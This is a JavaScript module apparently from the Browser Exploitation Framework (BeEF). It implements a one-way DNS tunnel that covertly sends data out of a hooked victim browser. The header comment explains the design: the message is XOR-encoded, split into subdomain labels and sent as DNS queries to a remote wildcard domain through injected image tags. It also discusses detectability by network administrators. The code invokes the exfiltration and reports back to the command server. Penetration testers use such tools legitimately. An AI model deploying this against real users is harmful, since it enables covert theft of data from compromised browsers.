//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*
Poor man's unidirectional DNS tunnel in JavaScript.
The largely-untested, highly experimental first draft.

How it works:

A remote domain with a DNS server configured to accept wildcard subdomains is required to receive the data. BeEF does not support this feature so you're on your own when it comes to decoding the information.

A domain and message are taken as input. The message is XOR'd, url encoded, the "%" are replaced with "." and the message is split into segments of 230 bytes. The segments are sent in sequence however there are plans to randomize the order.

To allow the original message to be pieced back together each message is allocated an id and each DNS query is given a sequence number. The final domain name used in the DNS query is structured as follows:

MESSAGE_ID.SEGMENT_SEQUENCE_NUMBER.TOTAL_SEGMENTS.XOR_KEY.MESSAGE_SEGMENT.REMOTE_DOMAIN

Assuming a remote domain of max length 63 characters this leaves 167 characters for our message segment in each query as per the following breakdown:

[5].[5].[5].[5].[255-5-5-5-5-5-DOMAIN_LENGTH].[DOMAIN_LENGTH]

This approach, while flawed and simplistic, should comply with the limitations to DNS according to RFC 1035:
o Domain names must only consist of a-z, A-Z, 0-9, hyphen (-) and fullstop (.) characters
o Domain names are limited to 255 characters in length (including dots)
o The name space has a maximum depth of 127 levels (ie, maximum 127 subdomains)
o Subdomains are limited to 63 characters in length (including the trailing dot)

Each segment is sent by appending an image to the DOM containing the query as the image source. The images are later destroyed.

Caveats:
o Unidirectional - Data can only be sent one way.
o Message size - Limited to messages less than 64KB in length.
o Limited by JavaScript strings. Byte code needs to be converted to a compatible string before it can be sent. There's also lots of wasted space. Converting to hex would be much cleaner and would save a few bytes for each query.
o Throttling - There is no throttling. The browser may only initiate x amount of simultaneous connections. The requests should be throttled to avoid hitting the cap. TODO: Introduce a wait delay between each request to partially account for this.
o Time consuming - It takes forever and there is no resume feature.
o Encryption - Uses very weak "encryption" (XOR) and the key is transferred with the request.
o Encoding - Using encodeURI() is a terrible alternative to using base64 for a few reasons. It *might* fail horribly if a high value unicode character is XOR'd with a high value key. It *will* fail horribly if a low value key is used.
o Compression - The requests are not compressed.
o Encoding - Currently uses JavaScript fromCharCode unicode rather than a modified version of base64.
o Padding - The last query contains no padding which makes it easy for network administrators to spot. This isn't really a problem as the sequence numbers are in plain sight.

*/
beef.execute(function() {

	var msgId   = "<%= @command_id %>";
	var wait    = "<%= @wait %>";
	var domain  = "<%= @domain %>";
	var message = "<%= @message %>";

	beef.net.dns.send(msgId, message, domain, wait, function(num) { beef.net.send('<%= @command_url %>', <%= @command_id %>, 'dns_requests='+num+' requests sent') } );

});

